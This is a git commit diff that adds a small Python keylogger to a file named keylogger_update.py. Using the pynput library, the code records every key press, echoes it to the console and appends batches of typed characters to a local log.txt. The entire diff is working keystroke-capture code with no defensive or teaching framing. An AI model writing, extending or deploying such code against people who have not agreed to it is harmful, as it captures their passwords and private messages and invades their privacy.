e4be7c44c1da4ae786fef38a26f103bb2e6b6ffe
Mahdi <mahdi.ndc21@gmail.com>
2023-09-14 23:52:27 +0600

    added

--- keylogger_update.py
+++ keylogger_update.py
@@ -1,3 +1,35 @@
 import pynput
 from pynput.keyboard import Key, Listener
 
+count = 0
+keys = []
+
+def on_press(key):
+    global count, keys
+
+    keys.append(key)
+    count += 1
+    print(f"{key} pressed")
+
+    if count >= 6:
+        count = 0
+        write_file(keys)
+        keys = []
+
+
+def write_file(key):
+    with open('log.txt', 'a') as f:
+        for key in keys:
+            k = str(key).replace("'", '')
+            if k.find('space') > 0:
+                f.write('\n')
+            elif k.find('Key') == -1:
+                f.write(str(k))
+
+def on_release(key):
+    if key == Key.esc:
+        return False
+
+with Listener(on_press = on_press, on_release = on_release) as listener:
+    listener.join()
+
